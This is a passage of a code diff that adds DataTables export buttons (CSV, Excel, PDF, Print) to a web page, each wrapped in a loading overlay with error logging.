+                                    console.error('CSV export failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'excel',
+                        text: 'Excel',
+                        title: 'Corporate Client Export',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('Excel export failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'pdf',
+                        text: 'PDF',
+                        title: 'Audit Trail Export',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.pdfHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('PDF export failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'print',
+                        text: 'Print',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.print.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('Print failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    }
+                ]
+            });
+        }
+    });
+</script>
 </body>
 </html>
